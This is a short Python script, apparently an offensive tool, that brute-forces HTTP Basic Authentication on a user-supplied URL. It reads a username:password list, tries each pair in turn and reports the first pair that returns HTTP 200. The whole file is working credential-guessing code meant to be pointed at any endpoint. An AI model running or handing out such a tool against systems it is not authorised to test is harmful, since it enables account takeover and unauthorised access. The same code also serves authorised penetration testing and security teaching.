import requests
import argparse

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Does a basic bruteforce, using HTTP Basic Authentication, against a web endpoint.")
    parser.add_argument("credslist", type=str, help="A list of credentials, one set per line, in format [username]:[password]")
    parser.add_argument("target", type=str, help="The target URL to authenticate against")

    args = parser.parse_args()
    success = False

    with open(args.credslist) as f:
        for line in f:
            creds = line.strip("\n").split(":")
            response = requests.get(args.target, auth=(creds[0], creds[1]))

            if response.status_code == 200:
                print("[+] Valid credentials: {}:{}".format(creds[0], creds[1]))
                success = True
                break

    if success != True:
        print("[-] No valid credentials found.")


